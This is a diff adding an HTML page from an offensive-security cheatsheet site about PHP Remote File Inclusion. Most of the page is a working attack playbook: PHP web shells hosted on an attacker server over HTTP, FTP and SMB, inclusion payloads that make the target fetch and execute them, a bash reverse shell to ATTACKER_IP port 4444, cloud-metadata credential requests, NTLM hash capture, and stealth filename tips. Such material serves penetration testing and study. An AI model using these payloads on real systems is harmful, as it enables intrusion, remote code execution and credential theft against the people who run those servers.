@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>RFI - Remote File Inclusion · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>RFI - Remote File Inclusion</h1><p class="cx-lede">Including remote files for RCE via HTTP, FTP, and SMB - hosting a PHP shell and getting the target to fetch and execute it.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1059</span><span class="cx-tag">D3FEND D3-EAL, D3-NTA</span><span class="cx-tag">IMPACT ServerSideEval, RCE, InternalAccess</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>When the inclusion function supports remote URLs, host a PHP payload on your own server and include it. The target fetches your file, executes it, returns the output.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Confirm RFI works - include a known-good local URL first
+?page=http://127.0.0.1/index.php
+
+# Host a shell on your attacker box
+echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php
+sudo python3 -m http.server 80
+
+# Trigger inclusion
+?page=http://&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id
+
+# Other transports when HTTP is blocked
+?page=ftp://&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id
+?page=\\&lt;ATTACKER_IP&gt;\share\shell.php&amp;cmd=id        # Windows-only, SMB</code></pre></figure>
+<p>Success indicator: command output (<code>uid=...</code> for <code>id</code>) in the response.</p>
+<h2 id="prerequisites">Prerequisites</h2>
+<p>RFI requires three conditions, in order of likelihood-of-failure:</p>
+<ol>
+<li>
+<p><strong>The inclusion function supports remote URLs.</strong> Not every LFI is an RFI - <code>require()</code> doesn't, <code>file_get_contents()</code> does. See the <a href="../index.html">overview</a> table.</p>
+</li>
+<li>
+<p><strong><code>allow_url_include = On</code></strong> in the PHP config. Default is <code>Off</code> in modern PHP. Check via <a href="../php-filters/index.html"><code>php://filter</code></a> reading the <code>php.ini</code>:</p>
+</li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl -s &quot;https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini&quot; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{200,}&#x27; | base64 -d | grep allow_url_include</code></pre></figure>
+<ol start="3">
+<li><strong>Outbound network access from the target to your hosting server.</strong> Many production environments restrict outbound traffic. If port 80/443 are filtered, FTP or SMB might still work. If all outbound is blocked, RFI is closed.</li>
+</ol>
+<p>The Windows SMB exception is notable: SMB inclusion via UNC paths doesn't require <code>allow_url_include</code> because Windows treats UNC paths as local file paths. If the target is on Windows and you can reach it over SMB, you bypass condition #2.</p>
+<h2 id="confirming-rfi">Confirming RFI</h2>
+<p>The cleanest first probe - include a URL the target can definitely reach (itself):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=http://127.0.0.1/index.php</code></pre></figure>
+<p>What you should see: the target's own index page rendered inside the response (twice if the inclusion is mid-page). This confirms:</p>
+<ul>
+<li>The wrapper recognizes <code>http://</code> URLs</li>
+<li>The fetch succeeded</li>
+<li>The fetched content is being processed (executed for PHP-able sinks, returned as text for read-only sinks)</li>
+</ul>
+<p>If the rendered output includes PHP-executed content (not raw <code>&lt;?php</code> tags), the inclusion <em>executes</em> the fetched file - RCE is reachable. If it shows raw source, only file disclosure works.</p>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Including the <em>vulnerable page itself</em> (e.g., <code>?page=http://127.0.0.1/index.php</code>) can cause infinite recursion. The page includes itself, which includes itself, until the server runs out of resources. Use a different known page (<code>info.php</code>, <code>about.html</code>) for the confirmation probe.</p>
+</div>
+<h2 id="http-based-rfi">HTTP-based RFI</h2>
+<p>The standard path. Host a PHP shell on your machine, include it from the target.</p>
+<h3 id="setup">Setup</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Step 1 - write the shell
+echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.php
+
+# Step 2 - host on port 80 (sudo needed for low ports, but reduces firewall friction)
+sudo python3 -m http.server 80
+# Output:
+# Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+# Step 3 - trigger inclusion
+curl &quot;https://target/?page=http://&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id&quot;</code></pre></figure>
+<p>The Python server logs the inclusion request:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>target.ip - - [...] &quot;GET /shell.php HTTP/1.0&quot; 200 -</code></pre></figure>
+<p>The HTTP response from the target includes the output of <code>id</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<h3 id="why-port-80-specifically">Why port 80 specifically</h3>
+<p>Two reasons:
+- <strong>Firewall traversal</strong> - corporate firewalls often allow outbound 80 and 443 but block other ports. Hosting on 80 maximizes the chance of reachability.
+- <strong>WAF avoidance</strong> - some WAFs treat outbound requests to non-standard ports as suspicious. Port 80 looks like a normal HTTP fetch.</p>
+<p>Port 443 is similar but requires a real or self-signed TLS cert - Python's <code>http.server</code> doesn't do TLS by default.</p>
+<h3 id="when-the-url-gets-a-php-appended">When the URL gets a <code>.php</code> appended</h3>
+<p>A common LFI sink appends <code>.php</code>:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">include($_GET[&#x27;page&#x27;] . &quot;.php&quot;);</code></pre></figure>
+<p>Your <code>?page=http://&lt;ATTACKER_IP&gt;/shell.php</code> becomes <code>http://&lt;ATTACKER_IP&gt;/shell.php.php</code>. Two fixes:</p>
+<ol>
+<li><strong>Rename the hosted file</strong>:</li>
+</ol>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">mv shell.php shell.php.php       # so the .php suffix lines up</code></pre></figure>
+<ol start="2">
+<li><strong>Use a trailing <code>?</code> or <code>#</code></strong> to terminate the URL before the appended extension:</li>
+</ol>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=http://&lt;ATTACKER_IP&gt;/shell.php?       # ? makes the rest a query string
+?page=http://&lt;ATTACKER_IP&gt;/shell.php%23     # %23 = # makes it a fragment</code></pre></figure>
+<p>The <code>?</code> trick is cleaner - the appended <code>.php</code> becomes part of the query string and doesn't affect file resolution on the attacker server.</p>
+<h3 id="verifying-request-shape">Verifying request shape</h3>
+<p>Check exactly what the target sent by reading the Python server log:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sudo python3 -m http.server 80 2&gt;&amp;1 | tee /tmp/http.log
+
+# In another terminal, watch the log
+tail -f /tmp/http.log</code></pre></figure>
+<p>The log shows the exact path requested. If it shows <code>/shell.php.php</code> instead of <code>/shell.php</code>, you know the extension was appended and need to adjust.</p>
+<h2 id="ftp-based-rfi">FTP-based RFI</h2>
+<p>When HTTP is blocked, FTP often isn't - port 21 is sometimes overlooked in egress filtering.</p>
+<h3 id="setup_1">Setup</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Install pyftpdlib if needed
+pip install pyftpdlib
+
+# Run anonymous FTP server in the current directory
+sudo python3 -m pyftpdlib -p 21</code></pre></figure>
+<p>Default settings: anonymous read access, current directory shared. Drop your <code>shell.php</code> in the directory before starting.</p>
+<h3 id="inclusion">Inclusion</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=ftp://&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id</code></pre></figure>
+<p>By default, PHP attempts FTP login as anonymous. If the FTP server requires authentication, embed credentials:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=ftp://user:password@&lt;ATTACKER_IP&gt;/shell.php&amp;cmd=id</code></pre></figure>
+<h3 id="caveats">Caveats</h3>
+<ul>
+<li>FTP fetch is slower than HTTP - passive-mode handshakes add latency</li>
+<li>FTP servers behind NAT may have issues with PASV mode - most cloud VMs need the public IP advertised explicitly</li>
+<li>Modern egress filters increasingly include port 21</li>
+</ul>
+<p>When HTTP and FTP both fail, the egress is genuinely restricted - RFI is closed for the moment. Pivot to LFI-only techniques.</p>
+<h2 id="smb-based-rfi-windows-targets">SMB-based RFI (Windows targets)</h2>
+<p>Special case: when the target is Windows, UNC paths to remote SMB shares work as if they were local files. <strong><code>allow_url_include</code> is not required</strong> - Windows treats <code>\\server\share\file</code> as a local path.</p>
+<h3 id="setup_2">Setup</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Impacket&#x27;s smbserver, anonymous access by default with -smb2support
+impacket-smbserver -smb2support share /tmp/rfi-share
+
+# Drop your shell in /tmp/rfi-share
+echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; /tmp/rfi-share/shell.php</code></pre></figure>
+<h3 id="inclusion_1">Inclusion</h3>
+<p>UNC path syntax. Forward slashes can be used interchangeably with backslashes in most PHP setups:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=\\&lt;ATTACKER_IP&gt;\share\shell.php&amp;cmd=id
+?page=//&lt;ATTACKER_IP&gt;/share/shell.php&amp;cmd=id</code></pre></figure>
+<p>URL-encoded for transport:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=%5C%5C&lt;ATTACKER_IP&gt;%5Cshare%5Cshell.php&amp;cmd=id</code></pre></figure>
+<h3 id="caveats_1">Caveats</h3>
+<ul>
+<li><strong>Works reliably only on same-LAN scenarios.</strong> Windows SMB over the internet is usually blocked by ISP egress filtering and firewall defaults.</li>
+<li><strong>Server 2019+ may refuse outbound anonymous SMB.</strong> Default SMB-client hardening on recent Windows builds disables guest authentication.</li>
+<li><strong>NTLM hashes get sent in the SMB authentication handshake.</strong> If your SMB server captures the hashes (via <code>Responder</code> instead of plain SMB), you may not even need the file inclusion - the captured NTLMv2 hashes from the target's authenticated SMB connection can be cracked offline.</li>
+</ul>
+<p>The NTLM-capture side effect is sometimes the real win - RFI via SMB to a host on the same LAN frequently yields hashes from the web server's machine account, which can be relayed or cracked.</p>
+<h2 id="cross-protocol-rfi">Cross-protocol RFI</h2>
+<p>Some <code>allow_url_include</code>-enabled environments support less common URL schemes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://input                            # see Wrappers page
+?page=data://text/plain;base64,...           # see Wrappers page
+?page=gopher://...                           # rare; see SSRF for gopher tricks
+?page=expect://id                            # see Wrappers page
+?page=phar://...                             # see File-upload chain</code></pre></figure>
+<p>The <code>gopher://</code> scheme is more commonly an SSRF vector than an RFI vector. See the <a href="../../server-side/ssrf/schemas/index.html">SSRF schemas</a> page for details.</p>
+<h2 id="rfi-as-ssrf">RFI as SSRF</h2>
+<p>Even when RFI doesn't yield RCE (the inclusion function only reads, not executes), it's still an SSRF primitive:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=http://internal.corp.local/admin
+?page=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+?page=http://127.0.0.1:8080/                 # localhost-only services</code></pre></figure>
+<p>The target's response includes whatever the fetched URL returned. This is functionally identical to <a href="../../server-side/ssrf/index.html">SSRF</a> - internal-network access, cloud metadata, port scanning.</p>
+<p>The distinction matters for reporting: RFI-with-RCE is critical, RFI-as-SSRF is high (still serious, lower direct impact). The same primitive enables both.</p>
+<h2 id="workflow">Workflow</h2>
+<p>A complete RFI engagement against a target with HTTP egress:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># 1. Confirm vulnerable parameter
+curl &#x27;https://target/?page=/etc/passwd&#x27;                   # Yes, LFI works
+
+# 2. Check allow_url_include via PHP filter
+curl -s &#x27;https://target/?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini&#x27; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{200,}&#x27; | base64 -d \
+    | grep allow_url_include
+# allow_url_include = On      → RFI feasible
+
+# 3. Confirm RFI with same-host include
+curl &#x27;https://target/?page=http://127.0.0.1/info.php&#x27;     # See own info.php - confirms remote URL parsing
+
+# 4. Set up payload host
+cat &gt; /tmp/rfi/shell.php &lt;&lt;&#x27;EOF&#x27;
+&lt;?php
+$cmd = $_GET[&#x27;cmd&#x27;] ?? &#x27;id&#x27;;
+echo &quot;[CMD] $cmd\n&quot;;
+echo `$cmd`;
+EOF
+
+cd /tmp/rfi &amp;&amp; sudo python3 -m http.server 80 &amp;
+
+# 5. Trigger
+curl &#x27;https://target/?page=http://&lt;ATTACKER_IP&gt;/shell.php?&amp;cmd=id&#x27;
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# 6. Upgrade to interactive shell
+curl &#x27;https://target/?page=http://&lt;ATTACKER_IP&gt;/shell.php?&amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F&lt;ATTACKER_IP&gt;%2F4444%200%3E%261%22&#x27;
+# Catch on nc -lvnp 4444</code></pre></figure>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=http://&lt;COLLAB&gt;/rfi-probe                          # Burp Collaborator or similar OOB callback
+?page=http://127.0.0.1/index.php                         # confirms RFI without external infra</code></pre></figure>
+<p>The OOB-callback probe is useful when the inclusion succeeds but doesn't produce visible output. A request landing at your Collaborator host confirms the application made the fetch - even if it couldn't display the result.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong><code>allow_url_include</code> blocks <code>http://</code> but not <code>php://filter</code>.</strong> When the config disables remote URL inclusion, local-file LFI still works. RFI is just one of the LFI exploitation paths - its closure doesn't close the underlying bug.</li>
+<li><strong>Egress filtering is the most common reason RFI fails.</strong> The target may be vulnerable in code but unable to reach your hosting server. Try ports 80, 443, 21, and (for Windows) 445 before declaring RFI dead.</li>
+<li><strong>The hosted file's name affects logging.</strong> Both the attacker's HTTP server and the target's access logs record the URL. Use innocuous filenames during stealth-required engagements (<code>favicon.ico</code>, <code>logo.png</code>) - though if the target executes the response as PHP regardless of name, this is just OPSEC, not a functional requirement.</li>
+<li><strong>RFI on cloud-hosted apps reaches the metadata service.</strong> Combine with the <a href="../../server-side/ssrf/index.html">SSRF</a> cluster's metadata-service techniques - RFI is functionally another SSRF transport for the same attack class.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The simplest way to know whether RFI works on a target: read the PHP config via <code>php://filter</code> and grep for <code>allow_url_include</code>. One request answers the question definitively, faster than trying various wrappers and interpreting failure modes.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../wrappers/index.html">Previous: Wrappers</a><a class="cx-next" href="../file-upload-chain/index.html">Next: File-upload chain</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
